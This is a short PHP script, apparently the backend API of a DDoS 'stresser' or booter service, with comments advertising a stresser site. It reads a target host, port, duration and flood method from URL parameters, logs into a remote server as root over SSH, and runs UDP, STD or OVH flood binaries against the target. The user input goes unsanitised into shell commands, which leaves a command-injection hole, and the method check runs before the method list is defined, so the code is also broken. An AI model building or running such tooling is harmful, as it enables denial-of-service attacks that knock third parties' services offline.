<?php
  include('Net/SSH2.php');

  //----------------------------------------------------------------------------------------------------------------------
  //This API is free therefor is does not contain essential features needed to host a stresser // api reseller securely.
  //This was coded by Shprqness from The Secret Intelligence http://secure.thesecretintelligence.org
  //Check out our current stresser -> https://stressing.ninja
  //----------------------------------------------------------------------------------------------------------------------

  //Your Server Address
  $address = "1.1.1.1";
  //Your SSH Port (Don't Touch If You're Not Sure)
  $serverPort = 22;
  //SSH User (By Default 'root')
  $user = "root";
  //SSH User's Password
  $password = "123";

  if (!function_exists("ssh2_connect")){ die("Please Install PHP-SSH2!"); }
  //variables for attack time, target host & port ect.
  $time = $_GET["time"];
  $method = $_GET["method"];
  $host = $_GET["host"];
  $port = $_GET["port"];
  if(empty($time)){die("Please fill in all parameters!");}
  if(empty($method)){die("Please fill in all parameters!");}
  if(empty($host)){die("Please fill in all parameters!");}
  if(empty($port)){die("Please fill in all parameters!");}
  if(!in_array($method, $methods)){ die("Invalid Method..."); }
  //Customize your methods here, if you do not know what you are doing, please ask someone who does to help you out!
  $methods = array("UDP", "STD", "OVH");

  function send(){
    global $method;
    global $methods;
    global $address;
    global $port;
    global $serverPort;
    global $user;
    global $password;
    global $time;
    global $host;

    $connection = ssh2_connect($address, $serverPort);
    if(ssh2_auth_password($connection, $user, $password)){
      //set your max attack time here
      if($time > 2000){ die("You've Exceeded The Max Time!"); }
      if($method == "UDP"){if(ssh2_exec($connection, "screen -dm ./UDP $host $port $time")){echo "Attack sent to $host:$port for $time seconds using $method!";}else{die("Ran into a error");}}
      if($method == "STD"){if(ssh2_exec($connection, "screen -dm ./STD $host $port $time")){echo "Attack sent to $host:$port for $time seconds using $method!";}else{die("Ran into a error");}}
      if($method == "OVH"){if(ssh2_exec($connection, "screen -dm ./OVH $host $port $time")){echo "Attack sent to $host:$port for $time seconds using $method!";}else{die("Ran into a error");}}

    }else{
      die("Could not login to remote server, this may be a error with the login credentials.");
    }

  }
  send();

 ?>
